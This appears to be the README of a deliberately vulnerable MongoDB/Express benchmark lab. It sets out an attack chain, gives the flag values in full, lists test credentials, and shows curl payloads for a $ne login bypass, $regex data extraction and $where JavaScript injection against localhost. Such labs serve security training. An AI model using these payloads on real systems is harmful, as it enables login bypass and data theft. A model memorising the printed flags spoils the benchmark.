# S7BEN-VHARD-008: MongoDB NoSQL Injection Chain

![Difficulty](https://img.shields.io/badge/difficulty-intermediate-yellow)
![Tier](https://img.shields.io/badge/tier-2-blue)
![Category](https://img.shields.io/badge/category-web-green)

## Overview

This benchmark demonstrates MongoDB NoSQL injection vulnerabilities in a Node.js/Express application using Mongoose ODM. Participants will exploit operator injection, regex-based data extraction, and JavaScript injection via the `$where` clause to achieve authentication bypass, data exfiltration, and privilege escalation.

## Learning Objectives

- Understanding NoSQL injection in MongoDB
- Exploiting MongoDB query operators (`$ne`, `$gt`, `$regex`, `$where`)
- Authentication bypass via operator injection
- JavaScript injection in `$where` clauses
- Data extraction through NoSQL injection
- Understanding Mongoose security pitfalls

## Architecture

```
┌─────────────────────────────────────────────────────┐
│  web-app (Express + Mongoose)                       │
│  - Port: 3000                                       │
│  - Vulnerable login endpoint                        │
│  - $regex and $where injection points               │
│  IP: 172.26.0.10                                    │
└──────────────────┬──────────────────────────────────┘
                   │ nosql-net
┌──────────────────┴──────────────────────────────────┐
│  mongo-db (MongoDB 7)                               │
│  - Port: 27017 (internal)                           │
│  - Collections: users, admins, secrets              │
│  - Contains flags in secrets collection             │
│  IP: 172.26.0.20                                    │
└──────────────────┬──────────────────────────────────┘
                   │ nosql-net
┌──────────────────┴──────────────────────────────────┐
│  admin-panel (Express)                              │
│  - Port: 4000                                       │
│  - Admin dashboard with all flags                   │
│  - Database management interface                    │
│  IP: 172.26.0.30                                    │
└─────────────────────────────────────────────────────┘
```

## Vulnerabilities

| CVE/ID | Vulnerability | Severity | Description |
|--------|---------------|----------|-------------|
| CWE-943 | NoSQL Injection | Critical | Unsanitized user input in MongoDB queries |
| CUSTOM-NOSQL-01 | Authentication Bypass | Critical | Login vulnerable to `$ne` operator injection |
| CUSTOM-NOSQL-02 | JavaScript Injection | Critical | `$where` clause allows arbitrary JavaScript execution |

## Attack Chain

1. **Phase 1**: NoSQL Injection Discovery - Identify injection points
2. **Phase 2**: Authentication Bypass - Exploit `$ne` operator
3. **Phase 3**: Data Extraction - Use `$regex` for enumeration
4. **Phase 4**: JavaScript Injection - Exploit `$where` clause
5. **Phase 5**: Admin Panel Access - Retrieve all flags

## Flags

| Flag | Value | Technique | Difficulty |
|------|-------|-----------|------------|
| FLAG_BYPASS | `S7BEN{nosql_auth_bypass_ne_operator_a1b2c3}` | $ne operator bypass | Easy |
| FLAG_REGEX | `S7BEN{nosql_regex_data_extraction_d4e5f6}` | $regex extraction | Medium |
| FLAG_WHERE | `S7BEN{nosql_where_javascript_injection_g7h8i9}` | $where injection | Hard |
| FLAG_ADMIN | `S7BEN{nosql_admin_panel_access_j1k2l3}` | Admin access | Bonus |

## Quick Start

### Prerequisites

- Docker and Docker Compose
- curl or HTTP client
- jq (optional, for JSON parsing)

### Build and Start

```bash
cd benchmarks/S7BEN-VHARD-008
make build
make up
```

Or manually:
```bash
docker compose build
docker compose up -d
```

### Verify Services

```bash
make test
```

Expected output:
```
Web-app: healthy
Admin-panel: healthy
MongoDB: healthy
```

### Access Points

- **Web Application**: http://localhost:3000
- **Admin Panel**: http://localhost:4000
- **MongoDB**: localhost:27017 (internal only)

## Test Credentials

| Username | Password | Role |
|----------|----------|------|
| alice | alice123 | user |
| bob | bob456 | user |
| charlie | charlie789 | user |
| guest | guest | guest |

## Exploitation Example

### Authentication Bypass

```bash
curl -X POST http://localhost:3000/api/login \
  -H "Content-Type: application/json" \
  -d '{
    "username": {"$ne": null},
    "password": {"$ne": null}
  }'
```

### Regex Data Extraction

```bash
curl -X POST http://localhost:3000/api/search \
  -H "Content-Type: application/json" \
  -d '{
    "username": {"$regex": "^admin"}
  }'
```

### JavaScript Injection

```bash
curl -X POST http://localhost:3000/api/advanced-search \
  -H "Content-Type: application/json" \
  -d '{
    "condition": "this.technique == '\''where_injection'\''"
  }'
```

## Full Testing Guide

For comprehensive exploitation instructions, see [TESTING.md](TESTING.md).

## Cleanup

```bash
make down
```

Or remove all data:
```bash
make clean
```

## Tools Required

- curl or Postman
- jq (for JSON parsing)
- Python 3.x (optional for automation)
- MongoDB client (optional)

## Estimated Time

- Setup: 5-10 minutes
- Exploitation: 40-70 minutes
- Total: 45-80 minutes

## Hints

- MongoDB operators start with `$` (e.g., `$ne`, `$gt`, `$regex`, `$where`)
- JSON payloads can inject operators: `{"username": {"$ne": null}}`
- `$ne` operator means "not equal" - useful for bypassing authentication
- `$regex` allows pattern matching - useful for data extraction
- `$where` accepts JavaScript code - enables code execution

## Security Notice

⚠️ **WARNING**: This benchmark contains intentional security vulnerabilities.
- **DO NOT** deploy in production environments
- **DO NOT** expose to untrusted networks
- For educational purposes only

## References

- [OWASP NoSQL Injection](https://owasp.org/www-community/Injection_Flaws#NoSQL_Injection)
- [MongoDB Injection - HackTricks](https://book.hacktricks.xyz/pentesting-web/nosql-injection)
- [OWASP NoSQL Injection Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html#nosql-injection)
- [MongoDB Query Operators](https://www.mongodb.com/docs/manual/reference/operator/query/)

## Tags

`nosql` `mongodb` `injection` `authentication-bypass` `javascript-injection` `mongoose` `express` `phase-4`

## Author

Strike7 Security Benchmarks

## Version

1.0.0 (Last updated: 2026-01-13)
